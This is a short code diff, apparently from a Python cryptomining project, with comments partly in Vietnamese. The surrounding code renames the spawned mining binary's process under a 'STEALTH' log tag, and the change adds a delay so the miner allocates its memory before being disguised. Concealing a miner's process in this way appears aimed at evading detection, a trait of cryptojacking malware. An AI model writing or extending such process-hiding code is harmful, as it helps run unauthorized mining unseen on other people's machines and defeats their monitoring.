@@ -301,7 +301,10 @@ def main():
                     threading.Thread(target=_retry_rename, daemon=True).start()
                 else:
                     logger.info(f"✅ [GPU-POST-EXEC-STEALTH] Renamed child PID {process.pid} to '{new_name}'")
-                # Publish real PID to EventBus so other modules can target it
+                # Sau khi khởi động process con (mining binary):
+                time.sleep(3)  # Đảm bảo tiến trình mining đã cấp phát xong bộ nhớ lớn
+                # Đổi tên process như cũ
+                # Publish PID thật lên EventBus
                 try:
                     from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
                     event_payload = {
